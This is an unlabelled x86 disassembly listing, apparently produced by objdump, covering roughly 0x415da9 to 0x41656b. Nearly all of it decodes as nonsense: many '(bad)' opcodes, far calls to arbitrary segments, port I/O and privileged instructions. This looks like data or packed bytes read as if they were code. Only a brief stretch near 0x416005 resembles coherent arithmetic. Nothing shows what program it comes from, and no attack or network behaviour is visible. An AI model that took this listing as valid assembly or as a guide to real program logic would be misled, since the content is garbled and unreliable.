  415da9:	sub    DWORD PTR [ebp-0x4930aa3],ebp
  415daf:	call   0x2f7a:0xd24c0a84
  415db6:	xlat   BYTE PTR ds:[ebx]
  415db7:	daa    
  415db8:	jne    0x415e33
  415dba:	fs pop ss
  415dbc:	sbb    al,0xe7
  415dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dbf:	scas   eax,DWORD PTR es:[edi]
  415dc0:	repz (bad) 
  415dc2:	jmp    0xff93:0x6f4543cc
  415dc9:	push   ecx
  415dca:	aam    0xe7
  415dcc:	mov    esi,0x88a5ad48
  415dd1:	fist   WORD PTR [eax]
  415dd3:	and    BYTE PTR [ebp+0x5918eaef],cl
  415dd9:	sbb    esi,DWORD PTR [ecx-0x4a]
  415ddc:	sbb    DWORD PTR [eax-0x7f],ebp
  415ddf:	pop    eax
  415de0:	stc    
  415de1:	aaa    
  415de2:	jmp    FWORD PTR [edx+0x1c]
  415de5:	stos   BYTE PTR es:[edi],al
  415de6:	pop    ebp
  415de7:	mov    eax,ds:0x9ccc3508
  415dec:	and    DWORD PTR [ebx+ebx*2+0x39dfb180],edx
  415df3:	jbe    0x415e43
  415df5:	jns    0x415e5f
  415df7:	mov    dh,0x65
  415df9:	out    dx,eax
  415dfa:	pusha  
  415dfb:	pop    es
  415dfc:	sti    
  415dfd:	ror    BYTE PTR [ecx+0x39b578ab],1
  415e03:	push   ebp
  415e04:	inc    edi
  415e05:	fnstcw WORD PTR [ebp+ebx*4-0x4755a9e]
  415e0c:	push   edi
  415e0d:	fldenv [ebx]
  415e0f:	mov    WORD PTR [ebp-0x20],ds
  415e12:	dec    edi
  415e13:	mov    al,0xdb
  415e15:	leave  
  415e16:	cmp    edi,esi
  415e18:	mov    bh,0x85
  415e1a:	stos   BYTE PTR es:[edi],al
  415e1b:	adc    eax,edi
  415e1d:	or     ecx,DWORD PTR [eax+0x1e3f0560]
  415e23:	(bad)  
  415e24:	xor    al,0xf0
  415e26:	sbb    ch,BYTE PTR [ebp+0xa]
  415e29:	aam    0x21
  415e2b:	xchg   esi,eax
  415e2c:	add    al,0xe9
  415e2e:	(bad)  
  415e2f:	mov    al,0x23
  415e31:	(bad)  
  415e32:	push   ss
  415e33:	fiadd  WORD PTR cs:[edx+0x38db4d13]
  415e3a:	(bad)  
  415e3b:	mov    ecx,ebx
  415e3d:	(bad)  
  415e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e40:	leave  
  415e41:	push   es
  415e42:	call   FWORD PTR [edi]
  415e44:	shr    BYTE PTR [ebx+esi*4-0x7f],1
  415e48:	add    dh,BYTE PTR [eax+0x1a]
  415e4b:	push   ds
  415e4c:	arpl   WORD PTR [ebx-0x21],bp
  415e4f:	sbb    edi,DWORD PTR [ecx]
  415e51:	and    DWORD PTR [edx],esi
  415e53:	rcr    DWORD PTR [ebx],0xd6
  415e56:	fild   QWORD PTR [ebx+0x4348d2c5]
  415e5c:	pop    es
  415e5d:	sbb    al,0x49
  415e5f:	pop    esp
  415e60:	sbb    eax,0xd7596ad8
  415e65:	mov    bl,0xd8
  415e67:	jb     0x415eb6
  415e69:	daa    
  415e6a:	or     cl,BYTE PTR [edi-0x1f0997f4]
  415e70:	push   ebp
  415e71:	mov    ecx,0xeabd7aa6
  415e76:	jmp    0x415ec9
  415e78:	scas   eax,DWORD PTR es:[edi]
  415e79:	in     al,dx
  415e7a:	sub    eax,0x8c315d7e
  415e7f:	lahf   
  415e80:	(bad)  
  415e81:	repz in eax,dx
  415e83:	push   ecx
  415e84:	scas   eax,DWORD PTR es:[edi]
  415e85:	mov    ch,0x3e
  415e87:	aas    
  415e88:	push   cs
  415e89:	out    0x12,eax
  415e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e8c:	jle    0x415e77
  415e8e:	or     al,0x1
  415e90:	cmc    
  415e91:	clc    
  415e92:	mul    edx
  415e94:	test   al,0xd1
  415e96:	and    cl,BYTE PTR [ecx+0x2c]
  415e99:	xchg   ebp,eax
  415e9a:	stos   DWORD PTR es:[edi],eax
  415e9b:	pop    edi
  415e9c:	call   0xdedc:0xbe0d4e8f
  415ea3:	mov    edx,0xa887128c
  415ea8:	lock scas eax,DWORD PTR es:[edi]
  415eaa:	out    0x0,al
  415eac:	add    BYTE PTR [ecx],ah
  415eae:	clc    
  415eaf:	out    0x17,al
  415eb1:	popa   
  415eb2:	stc    
  415eb3:	and    al,0x32
  415eb5:	and    bl,BYTE PTR [esi+ebp*4]
  415eb8:	sar    DWORD PTR [edi+0x39],0x49
  415ebc:	inc    ebp
  415ebd:	add    BYTE PTR [edx],al
  415ebf:	call   0xc5bae8e
  415ec4:	aas    
  415ec5:	(bad)  
  415ec6:	sub    eax,0xbe86a604
  415ecb:	adc    cl,BYTE PTR [edi+0x0]
  415ece:	stos   BYTE PTR es:[edi],al
  415ecf:	je     0x415f4d
  415ed1:	dec    esp
  415ed2:	cmp    eax,0x12e5c081
  415ed7:	or     al,0xe5
  415ed9:	pop    ecx
  415eda:	sub    DWORD PTR [edx-0x77],esi
  415edd:	and    BYTE PTR [esi],dh
  415edf:	push   edi
  415ee0:	mov    al,0x5b
  415ee2:	fisub  WORD PTR [esi+0x42]
  415ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee6:	or     DWORD PTR ds:0x62803874,eax
  415eec:	sbb    edx,esi
  415eee:	ds dec edx
  415ef0:	retf   0x2705
  415ef3:	pop    ds
  415ef4:	shl    DWORD PTR [edx],cl
  415ef6:	mov    esi,0xf97d1a27
  415efb:	stos   DWORD PTR es:[edi],eax
  415efc:	lods   eax,DWORD PTR ds:[esi]
  415efd:	adc    eax,0x956ddf0f
  415f02:	jmp    0x90bb:0x44714f17
  415f09:	bound  eax,QWORD PTR [edi+0x6f]
  415f0c:	test   eax,0x4b839343
  415f11:	sub    al,0x2d
  415f13:	lods   al,BYTE PTR ds:[esi]
  415f14:	lahf   
  415f15:	std    
  415f16:	xchg   edi,eax
  415f17:	xchg   esi,eax
  415f18:	cmp    al,0x6f
  415f1a:	stos   BYTE PTR es:[edi],al
  415f1b:	xor    dl,BYTE PTR [esi+ebx*4-0x19]
  415f1f:	xlat   BYTE PTR ds:[ebx]
  415f20:	mov    al,0xa
  415f22:	jle    0x415ed4
  415f24:	xchg   ebp,eax
  415f25:	and    esp,DWORD PTR [ecx+0x62]
  415f28:	iret   
  415f29:	(bad)  
  415f2a:	pop    ss
  415f2b:	inc    esp
  415f2c:	sub    dh,0xea
  415f2f:	loope  0x415f77
  415f31:	test   cl,cl
  415f33:	mov    bl,0xd6
  415f35:	push   es
  415f36:	xor    eax,0x7b7be1a6
  415f3b:	mov    al,0x6b
  415f3d:	push   edi
  415f3e:	sub    eax,0xb490d437
  415f43:	adc    edx,DWORD PTR [ebp-0x7b]
  415f46:	pop    ds
  415f47:	cld    
  415f48:	push   esi
  415f49:	retf   0xda02
  415f4c:	cmp    BYTE PTR [esi+ebx*1],0x1d
  415f50:	push   ss
  415f51:	int    0x55
  415f53:	fwait
  415f54:	or     eax,eax
  415f56:	outs   dx,DWORD PTR ds:[esi]
  415f57:	push   cs
  415f58:	stos   BYTE PTR es:[edi],al
  415f59:	pop    ecx
  415f5a:	cmp    al,0x6
  415f5c:	and    cl,BYTE PTR [ebx+0x592b3db]
  415f62:	or     dl,BYTE PTR [ecx-0x3dadc48c]
  415f68:	shl    BYTE PTR [edx],0x54
  415f6b:	int    0x17
  415f6d:	add    bl,0xf4
  415f70:	sahf   
  415f71:	add    BYTE PTR [esi],dh
  415f73:	mov    al,0x83
  415f75:	dec    ebp
  415f76:	js     0x415f32
  415f78:	pop    ebx
  415f79:	cmp    BYTE PTR [ecx+0x606c28dd],ah
  415f7f:	mov    cl,bl
  415f81:	sub    al,0x2
  415f83:	rcr    ch,cl
  415f85:	pushf  
  415f86:	aad    0xba
  415f88:	out    dx,eax
  415f89:	sbb    al,0x2d
  415f8b:	sahf   
  415f8c:	inc    esi
  415f8d:	mov    al,ds:0x628123fe
  415f92:	and    eax,0xa70a9a42
  415f97:	cmc    
  415f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f99:	xlat   BYTE PTR ds:[ebx]
  415f9a:	loope  0x415f40
  415f9c:	(bad)  
  415f9d:	aas    
  415f9e:	sub    DWORD PTR [edx],0x7a
  415fa1:	or     BYTE PTR [eax],al
  415fa3:	cmp    bh,BYTE PTR [edx]
  415fa5:	xor    ebp,ebp
  415fa7:	mov    bh,0xa6
  415fa9:	lods   al,BYTE PTR ds:[esi]
  415faa:	in     eax,0x15
  415fac:	sahf   
  415fad:	stc    
  415fae:	adc    eax,0xd1f8f585
  415fb3:	scas   al,BYTE PTR es:[edi]
  415fb4:	xor    eax,0x22761d8
  415fb9:	pop    ss
  415fba:	inc    esp
  415fbb:	mov    ds:0x5a0db8e5,eax
  415fc0:	not    DWORD PTR [edx+ebp*4-0x64a02e81]
  415fc7:	(bad)  
  415fc8:	mov    ebp,0x682fabfc
  415fcd:	ja     0x41604a
  415fcf:	mov    ebp,0x4c00f49d
  415fd4:	in     eax,0x51
  415fd6:	jbe    0x415fb9
  415fd8:	retf   
  415fd9:	icebp  
  415fda:	mov    al,ds:0x9a3388ce
  415fdf:	das    
  415fe0:	push   es
  415fe1:	out    dx,al
  415fe2:	arpl   dx,di
  415fe4:	dec    ebp
  415fe5:	jo     0x41604c
  415fe7:	bound  esi,QWORD PTR [eax+edi*4+0x5e]
  415feb:	out    dx,al
  415fec:	mov    ebp,0x81fd8605
  415ff1:	push   edi
  415ff2:	adc    esp,DWORD PTR [ebp-0x80]
  415ff5:	ss cdq 
  415ff7:	cmc    
  415ff8:	retf   
  415ff9:	pushf  
  415ffa:	inc    eax
  415ffb:	adc    BYTE PTR [ecx],bh
  415ffd:	into   
  415ffe:	das    
  415fff:	cmp    al,0xd0
  416001:	fsub   st,st(5)
  416003:	je     0x415fe6
  416005:	xor    edx,ebx
  416007:	mov    DWORD PTR [ebp-0x50],edx
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0xb07fe620
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	sub    BYTE PTR [ebx+0x5b],0x40
  41605f:	loop   0x415ff5
  416061:	xor    ebp,DWORD PTR [ecx+0x43a80d1a]
  416067:	shr    eax,0x68
  41606a:	daa    
  41606b:	add    eax,0xcd3571eb
  416070:	into   
  416071:	dec    edi
  416072:	cdq    
  416073:	pusha  
  416074:	stc    
  416075:	push   esp
  416076:	or     al,0x63
  416078:	jnp    0x4160dc
  41607a:	out    dx,eax
  41607b:	or     eax,0x49007416
  416080:	add    ecx,0xc51dc2ca
  416086:	rcl    DWORD PTR [eax],cl
  416088:	push   eax
  416089:	dec    esp
  41608a:	sar    dl,1
  41608c:	sub    eax,DWORD PTR [esi+0x47]
  41608f:	pop    esp
  416090:	test   DWORD PTR [edx+0x6b2000d7],eax
  416096:	mov    ecx,0x2401c5bd
  41609b:	sub    DWORD PTR [edi],ecx
  41609d:	sar    eax,0xab
  4160a0:	dec    esi
  4160a1:	adc    BYTE PTR [ecx+0x75],al
  4160a4:	arpl   WORD PTR [eax],cx
  4160a6:	xlat   BYTE PTR ds:[ebx]
  4160a7:	push   esi
  4160a8:	aaa    
  4160a9:	fdivr  QWORD PTR [ebx-0x53]
  4160ac:	push   ss
  4160ad:	push   ecx
  4160ae:	sti    
  4160af:	shl    DWORD PTR [ebx+0x3d],cl
  4160b2:	test   BYTE PTR [edx-0x4bfa29b0],dh
  4160b8:	push   ss
  4160b9:	retf   0xe13d
  4160bc:	or     DWORD PTR [ebx],0xffffffbe
  4160bf:	mov    eax,0x3e852dc6
  4160c4:	adc    BYTE PTR [edx+ebx*8-0xd],ah
  4160c8:	(bad)  
  4160c9:	jle    0x416101
  4160cb:	and    DWORD PTR [ecx+0xac1d0f6],esp
  4160d1:	push   ss
  4160d2:	pop    edx
  4160d3:	and    BYTE PTR [ebx+0x75],bl
  4160d6:	call   0x4698e395
  4160db:	ja     0x4160d4
  4160dd:	cmp    eax,0xce6b5f09
  4160e2:	jae    0x4160e3
  4160e4:	fld    st(6)
  4160e6:	aam    0x34
  4160e8:	leave  
  4160e9:	stos   BYTE PTR es:[edi],al
  4160ea:	jbe    0x416120
  4160ec:	ins    DWORD PTR es:[edi],dx
  4160ed:	clc    
  4160ee:	ret    0x18a4
  4160f1:	or     dl,al
  4160f3:	add    edx,DWORD PTR [edx+0x43677b03]
  4160f9:	sbb    BYTE PTR [ebx-0x96c8755],bl
  4160ff:	sub    DWORD PTR [ebx-0x76d23435],edi
  416105:	(bad)  
  416106:	pop    ds
  416107:	sub    eax,0xddf5fe3b
  41610c:	mov    esp,0xc2ac85ed
  416111:	cs push esp
  416113:	dec    ecx
  416114:	jne    0x416179
  416116:	fmul   st(3),st
  416118:	xor    bh,BYTE PTR [ebx+0x44]
  41611b:	xor    eax,0xbf93a950
  416120:	aam    0xf8
  416122:	jg     0x4160b0
  416124:	pop    ds
  416125:	mov    esi,DWORD PTR [esi-0x771b3c67]
  41612b:	or     ecx,DWORD PTR [edx+eax*1-0x5a]
  41612f:	(bad)  
  416130:	loope  0x416128
  416132:	pop    eax
  416133:	sbb    DWORD PTR [esp+ebp*8-0x7a],eax
  416137:	lods   al,BYTE PTR ds:[esi]
  416138:	mov    dl,0x7a
  41613a:	pop    esp
  41613b:	push   ss
  41613c:	hlt    
  41613d:	ror    DWORD PTR [ecx-0x58],1
  416140:	pusha  
  416141:	mov    eax,ds:0x1125191e
  416146:	cmp    al,0x92
  416148:	add    eax,0xfe9a8c20
  41614d:	fs fwait
  41614f:	fwait
  416150:	pop    ss
  416151:	or     DWORD PTR ds:0xe13dd5cd,ebp
  416157:	sub    DWORD PTR [esi],0xfffffff6
  41615a:	call   0x2050:0x5137e928
  416161:	(bad)  
  416163:	pop    esp
  416164:	loopne 0x4160ea
  416166:	repnz cmp ebp,DWORD PTR [ebp+0x7]
  41616a:	xor    ch,0x1e
  41616d:	pop    edx
  41616e:	mov    ecx,0x25459fce
  416173:	leave  
  416174:	mov    ecx,DWORD PTR [edx-0x641f519b]
  41617a:	arpl   WORD PTR [eax-0x66],si
  41617d:	push   es
  41617e:	hlt    
  41617f:	jp     0x41617f
  416181:	and    BYTE PTR ds:0x39592d20,ah
  416187:	mov    ds,WORD PTR [esp+edi*2-0x1bdfb347]
  41618e:	es stc 
  416190:	push   0x10
  416192:	pushf  
  416193:	and    edi,DWORD PTR [edx-0x2d971de0]
  416199:	ja     0x416120
  41619b:	imul   edx,DWORD PTR [ecx-0x5e7dd01c],0x13
  4161a2:	dec    edx
  4161a3:	inc    edi
  4161a4:	popf   
  4161a5:	dec    ebx
  4161a6:	imul   esp,DWORD PTR ds:0x2271442e,0xc1b060e7
  4161b0:	pushf  
  4161b1:	dec    esi
  4161b2:	sahf   
  4161b3:	dec    esp
  4161b4:	jne    0x416142
  4161b6:	adc    BYTE PTR [ebx+eiz*4-0x16aac8f4],al
  4161bd:	mov    cl,0xc5
  4161bf:	repnz mov WORD PTR [ebx-0x14],ss
  4161c3:	test   eax,0x58177c45
  4161c8:	out    dx,eax
  4161c9:	mov    ebx,0xa6804129
  4161ce:	ds xchg ebp,eax
  4161d0:	adc    DWORD PTR [eax-0x34f08dd7],edi
  4161d6:	inc    esi
  4161d7:	pop    es
  4161d8:	push   eax
  4161d9:	icebp  
  4161da:	repz sub ah,BYTE PTR [edx]
  4161dd:	sub    al,0xd9
  4161df:	push   0x5a8dac22
  4161e4:	mov    WORD PTR [esi-0x6301b66],?
  4161ea:	and    ah,BYTE PTR [esi-0xb2e0bba]
  4161f0:	in     al,dx
  4161f1:	les    ebx,FWORD PTR [ebx-0x2c]
  4161f4:	pop    esp
  4161f5:	hlt    
  4161f6:	lods   al,BYTE PTR ds:[esi]
  4161f7:	(bad)  
  4161f8:	outs   dx,BYTE PTR ds:[esi]
  4161f9:	add    eax,0xc9bf7383
  4161fe:	not    BYTE PTR [eax-0x12993831]
  416204:	ret    
  416205:	cld    
  416206:	cwde   
  416207:	or     DWORD PTR [edx-0x6c],0xa80bdb8
  41620e:	fwait
  41620f:	inc    edi
  416210:	sub    bh,BYTE PTR [ebx+0x6c2746c7]
  416216:	push   edx
  416217:	scas   eax,DWORD PTR es:[edi]
  416218:	dec    edi
  416219:	rol    BYTE PTR [eax+0x7e],0xa9
  41621d:	cmp    edx,DWORD PTR [ecx+ebx*8]
  416220:	add    al,0xb2
  416222:	inc    ebp
  416223:	(bad)  
  416224:	fild   QWORD PTR [edx+0xb]
  416227:	test   al,0xc1
  416229:	mov    al,BYTE PTR [ecx-0x461f7580]
  41622f:	push   ss
  416230:	pusha  
  416231:	and    DWORD PTR [esi-0x14a2218d],0xec8d3c94
  41623b:	daa    
  41623c:	jns    0x4161e3
  41623e:	xchg   ebx,eax
  41623f:	jmp    0xa9c5:0x36e0d8b3
  416246:	out    0x93,al
  416248:	mov    bl,0x28
  41624a:	je     0x416238
  41624c:	stos   DWORD PTR es:[edi],eax
  41624d:	jo     0x4161d8
  41624f:	enter  0xe415,0xc
  416253:	inc    ebx
  416254:	sbb    bh,BYTE PTR [ebp-0x2e]
  416257:	xor    eax,0x283763ad
  41625c:	fnstenv [edx-0x228606f2]
  416262:	je     0x41620a
  416264:	jge    0x9a229ba5
  41626a:	mov    ebp,0xd69d2d25
  41626f:	adc    DWORD PTR [edi-0x38],edi
  416272:	pop    ebp
  416273:	dec    esi
  416274:	out    dx,eax
  416275:	jmp    0x4162a5
  416277:	(bad)
  41627b:	add    bl,BYTE PTR [ebp-0x4c6c2219]
  416281:	lea    ecx,[edi-0x67]
  416284:	out    dx,al
  416285:	push   0x2e
  416287:	scas   al,BYTE PTR es:[edi]
  416288:	push   esi
  416289:	push   ds
  41628a:	xchg   edx,eax
  41628b:	xor    dl,BYTE PTR [ecx+eax*4]
  41628e:	xor    eax,0xd41b27ef
  416293:	cmp    al,0xdf
  416295:	and    eax,0x5f196d31
  41629a:	sub    ebx,DWORD PTR [ecx+0x4abccc02]
  4162a0:	repz xchg ah,al
  4162a3:	sub    al,BYTE PTR es:[ecx-0x1]
  4162a7:	call   0x1a65:0x3b0e6a9
  4162ae:	out    dx,al
  4162af:	mov    ebp,0xc6686865
  4162b4:	push   cs
  4162b5:	jne    0x41629d
  4162b7:	stc    
  4162b8:	out    0x5,eax
  4162ba:	pop    ds
  4162bb:	inc    esi
  4162bc:	inc    eax
  4162bd:	jo     0x4162e7
  4162bf:	sar    edi,1
  4162c1:	or     BYTE PTR [ebp+0x3ef9689f],ch
  4162c7:	xchg   BYTE PTR [ecx+0x6685e36b],cl
  4162cd:	clc    
  4162ce:	inc    edx
  4162cf:	loop   0x416339
  4162d1:	jno    0x416307
  4162d3:	fisubr DWORD PTR [esi+esi*8-0x57]
  4162d7:	push   0xca485467
  4162dc:	ret    0x1fa3
  4162df:	pop    ebp
  4162e0:	xchg   edx,eax
  4162e1:	pop    esp
  4162e2:	inc    ecx
  4162e3:	cmp    al,0x18
  4162e5:	cmp    ch,al
  4162e7:	and    al,0xe3
  4162e9:	les    edi,FWORD PTR [ebx+eax*1]
  4162ec:	dec    esp
  4162ed:	push   esi
  4162ee:	adc    ah,BYTE PTR [ecx+0x6a256827]
  4162f4:	push   edx
  4162f5:	retf   
  4162f6:	mov    ah,0xa1
  4162f8:	mov    BYTE PTR [ebp-0x3c84ad57],0xfe
  4162ff:	cmp    BYTE PTR [ebp+0x7ced5c0],cl
  416305:	mov    ebp,0xab597195
  41630a:	addr16 repnz mov eax,ds:0x7e60
  41630f:	or     eax,0xbd559509
  416314:	popf   
  416315:	(bad)  
  416316:	push   es
  416317:	(bad)  
  416318:	retf   0x975
  41631b:	mov    ebx,0x98ce4265
  416320:	out    0xb8,al
  416322:	jle    0x4162db
  416324:	out    0x92,al
  416326:	fld    QWORD PTR [ecx]
  416328:	push   ss
  416329:	push   es
  41632a:	arpl   WORD PTR [ebp-0x11a7c3d7],sp
  416330:	in     al,dx
  416331:	dec    eax
  416332:	repz test al,0xc1
  416335:	mov    edx,0x31dac1a1
  41633a:	sub    al,0x3
  41633c:	lahf   
  41633d:	in     al,0x42
  41633f:	or     al,0xde
  416341:	xor    ch,BYTE PTR [ebp+esi*4-0x31]
  416345:	shl    BYTE PTR [edi],0x19
  416348:	dec    edi
  416349:	and    DWORD PTR [edx+0x6],0x3d656b0c
  416350:	dec    esp
  416351:	jnp    0x4162e8
  416353:	loop   0x4163a7
  416355:	xchg   ecx,eax
  416356:	jg     0x416328
  416358:	and    edx,DWORD PTR [edi]
  41635a:	das    
  41635b:	ds stos BYTE PTR es:[edi],al
  41635d:	cdq    
  41635e:	mov    ds:0x2625b8a8,al
  416363:	xor    eax,0xce782a0e
  416368:	push   ecx
  416369:	inc    eax
  41636a:	(bad)
  41636d:	or     al,0xae
  41636f:	pop    esp
  416370:	inc    esi
  416371:	lds    esp,FWORD PTR [ebp-0xd]
  416374:	test   BYTE PTR [ebp+0x51a64a57],0x3f
  41637b:	xlat   BYTE PTR ds:[ebx]
  41637c:	gs retf 0xc97b
  416380:	mov    eax,0xc9bbb41b
  416385:	and    edi,esp
  416387:	ret    
  416388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416389:	push   esi
  41638a:	pop    edx
  41638b:	add    edx,DWORD PTR [ebx]
  41638d:	js     0x41636a
  41638f:	test   DWORD PTR [edx+0x18],edx
  416392:	add    dl,BYTE PTR [eax-0x8dbe682]
  416398:	sub    DWORD PTR [edi],esp
  41639a:	mov    ds:0xf05b9604,eax
  41639f:	loope  0x416417
  4163a1:	pop    edx
  4163a2:	cmc    
  4163a3:	cmp    edx,DWORD PTR [edx]
  4163a5:	push   0x74
  4163a7:	jl     0x4163ff
  4163a9:	sbb    esi,DWORD PTR [esi]
  4163ab:	mov    eax,0xcf19f5dc
  4163b0:	pusha  
  4163b1:	fidivr WORD PTR [eax+0xf]
  4163b4:	sub    eax,0x2a7015b5
  4163b9:	jmp    0x41641d
  4163bb:	int3   
  4163bc:	imul   eax,DWORD PTR [edi+0x13305e9c],0x61
  4163c3:	outs   dx,DWORD PTR ds:[esi]
  4163c4:	dec    ebp
  4163c5:	and    esi,DWORD PTR [ebx]
  4163c7:	xor    BYTE PTR ds:0x5e0625ce,cl
  4163cd:	(bad)  
  4163ce:	call   0xaad2:0xb660576f
  4163d5:	iret   
  4163d6:	push   cs
  4163d7:	loopne 0x4163dd
  4163d9:	cmp    ebx,eax
  4163db:	fistp  WORD PTR [eax-0x6]
  4163de:	outs   dx,DWORD PTR cs:[esi]
  4163e0:	clc    
  4163e1:	(bad)  
  4163e2:	fcomp  DWORD PTR [ecx-0x23]
  4163e5:	cmc    
  4163e6:	dec    esp
  4163e7:	inc    edi
  4163e8:	jge    0x4163ec
  4163ea:	aam    0xd2
  4163ec:	inc    esp
  4163ed:	cdq    
  4163ee:	pop    ebp
  4163ef:	call   0xf12f:0xb872d690
  4163f6:	int3   
  4163f7:	int3   
  4163f8:	loop   0x4163e6
  4163fa:	fs out dx,al
  4163fc:	mov    al,ds:0x5c4edfbf
  416401:	test   BYTE PTR [ecx],dl
  416403:	sbb    esp,eax
  416405:	jmp    0xf9d:0xb40bf04a
  41640c:	cli    
  41640d:	out    dx,al
  41640e:	pop    es
  41640f:	ret    
  416410:	popf   
  416411:	dec    edx
  416412:	sbb    DWORD PTR [ebx-0x5e],ebx
  416415:	daa    
  416416:	cmp    BYTE PTR [esi+eiz*4],0xf2
  41641a:	sbb    al,0xd8
  41641c:	mov    ecx,cs
  41641e:	pushf  
  41641f:	cmp    eax,0xf083fb0e
  416424:	mov    DWORD PTR [edx],ebx
  416426:	fsubr  QWORD PTR [esi+eiz*4-0x5e]
  41642a:	jne    0x4163be
  41642c:	or     bl,BYTE PTR [di+0x1902]
  416431:	adc    ch,BYTE PTR [ebx]
  416433:	jle    0x4164a4
  416435:	push   0x5ceb473b
  41643a:	add    dh,dl
  41643c:	leave  
  41643d:	bound  edx,QWORD PTR [edi]
  41643f:	mov    bl,0xfa
  416441:	or     al,BYTE PTR [ecx-0x16]
  416444:	pusha  
  416445:	xor    esp,eax
  416447:	retf   0x15f0
  41644a:	pop    es
  41644b:	mov    ds:0x9058587e,al
  416450:	xchg   bh,cl
  416452:	ja     0x4164b5
  416454:	mov    al,0x2
  416456:	jne    0x4164c4
  416458:	adc    al,BYTE PTR [edi-0x65]
  41645b:	fcomp  QWORD PTR [edx+0x3bd1af8b]
  416461:	add    al,0x33
  416463:	pushf  
  416464:	lods   eax,DWORD PTR ds:[esi]
  416465:	cmp    DWORD PTR [ecx+0x3f],0x58
  416469:	pop    eax
  41646a:	push   edx
  41646b:	sub    esi,edx
  41646d:	fs pusha 
  41646f:	pushf  
  416470:	lea    edi,[edx+ebx*1+0x50]
  416474:	mov    cl,0x1e
  416476:	jecxz  0x41641b
  416478:	rcr    DWORD PTR [eax+0x3507cd26],1
  41647e:	or     dl,bh
  416480:	pop    ebp
  416481:	fistp  QWORD PTR [edx+0x30]
  416484:	cmc    
  416485:	mov    ch,0x60
  416487:	jle    0x4164cb
  416489:	daa    
  41648a:	sbb    bh,dh
  41648c:	into   
  41648d:	dec    eax
  41648e:	lods   eax,DWORD PTR ds:[esi]
  41648f:	inc    eax
  416490:	push   ebp
  416491:	xor    DWORD PTR fs:[edx+ebp*4+0x54c9aa83],0xffffffbc
  41649a:	call   0xa0daa81f
  41649f:	jne    0x41646e
  4164a1:	leave  
  4164a2:	stos   BYTE PTR es:[edi],al
  4164a3:	shr    BYTE PTR [edx+0x66aeb627],1
  4164a9:	cmp    ebx,DWORD PTR [ebp-0x38]
  4164ac:	pop    ds
  4164ad:	aad    0x51
  4164af:	jns    0x41648a
  4164b1:	adc    BYTE PTR [esi],cl
  4164b3:	jecxz  0x41645b
  4164b5:	and    BYTE PTR [edx],ch
  4164b7:	pushf  
  4164b8:	sbb    eax,0x150aa1c1
  4164bd:	inc    edi
  4164be:	ret    0xcf22
  4164c1:	and    dh,BYTE PTR [ebx]
  4164c3:	loop   0x41651c
  4164c5:	push   es
  4164c6:	pusha  
  4164c7:	out    dx,eax
  4164c8:	or     bl,dh
  4164ca:	inc    ebp
  4164cb:	add    bh,BYTE PTR [esi-0x304b714d]
  4164d1:	jnp    0x4164fc
  4164d3:	stos   DWORD PTR es:[edi],eax
  4164d4:	push   ebx
  4164d5:	out    0xf0,eax
  4164d7:	lahf   
  4164d8:	mov    ah,0x44
  4164da:	(bad)
  4164df:	adc    eax,0xc0ef75ab
  4164e4:	xor    dh,ah
  4164e6:	dec    esp
  4164e7:	jp     0x416559
  4164e9:	(bad)  [edx-0x24]
  4164ec:	test   eax,0x27bab9d7
  4164f1:	inc    edx
  4164f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f3:	scas   al,BYTE PTR es:[edi]
  4164f4:	push   0x9926c433
  4164f9:	add    eax,0xef6b1655
  4164fe:	jb     0x416487
  416500:	mov    ebp,0x5c42e6d9
  416505:	sbb    bh,BYTE PTR [ebx+0xc]
  416508:	pop    ss
  416509:	aas    
  41650a:	arpl   WORD PTR [ebp-0x4d],ax
  41650d:	sub    DWORD PTR [ecx],edx
  41650f:	jle    0xb59c5029
  416515:	xor    BYTE PTR [edx+0xc7b99f4],bh
  41651b:	das    
  41651c:	nop
  41651d:	xchg   ebx,eax
  41651e:	out    0x3e,al
  416520:	jp     0x416569
  416522:	mov    ebp,0x4202cbe3
  416527:	xchg   BYTE PTR [edx],ch
  416529:	sbb    al,0x43
  41652b:	adc    al,0xbb
  41652d:	bnd jno 0x41654c
  416530:	(bad)  
  416532:	sahf   
  416533:	enter  0x6f52,0x74
  416537:	xor    al,0x49
  416539:	bound  ecx,QWORD PTR [eax-0x19]
  41653c:	push   ebx
  41653d:	loope  0x4165bc
  41653f:	mov    ebp,0xe1091cdf
  416544:	fbstp  TBYTE PTR [ecx]
  416546:	add    ecx,DWORD PTR [edx+ebx*4]
  416549:	imul   DWORD PTR [edx]
  41654b:	out    0x1a,al
  41654d:	adc    dh,BYTE PTR [eax]
  41654f:	push   ecx
  416550:	jne    0x416515
  416552:	adc    al,BYTE PTR [eax-0x16252b1e]
  416558:	shl    ch,cl
  41655a:	xor    al,0xdb
  41655c:	lds    eax,FWORD PTR [esi]
  41655e:	ret    
  41655f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416560:	inc    ecx
  416561:	pop    edx
  416562:	sti    
  416563:	inc    ecx
  416564:	rcl    DWORD PTR [eax-0x13],0x28
  416568:	push   ss
  416569:	aam    0xd2
  41656b:	xlat   BYTE PTR ds:[ebx]
